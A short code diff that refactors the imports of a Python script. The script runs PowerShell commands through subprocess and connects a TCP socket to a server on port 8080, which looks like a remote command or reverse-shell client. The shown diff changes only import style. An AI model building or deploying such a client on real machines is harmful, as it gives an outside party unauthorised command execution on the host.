@@ -1,10 +1,10 @@
-import socket
-import subprocess
+from socket import socket, AF_INET, SOCK_STREAM
+from subprocess import Popen,PIPE
 
 #command = "Get-Process | Where-Object { $_.CPU -gt 10 }"
 def run_powershell_command(command):
     # Run the PowerShell command
-    process = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    process = Popen(["powershell", command], stdout=PIPE, stderr=PIPE, text=True)
     
     # Get the standard output and standard error
     stdout, stderr = process.communicate()
@@ -21,7 +21,7 @@ def main():
     port = 8080
     check = "text"
     # Create a socket object
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket = socket(AF_INET, SOCK_STREAM)
     
     # Connect to the server
     client_socket.connect((host, port))
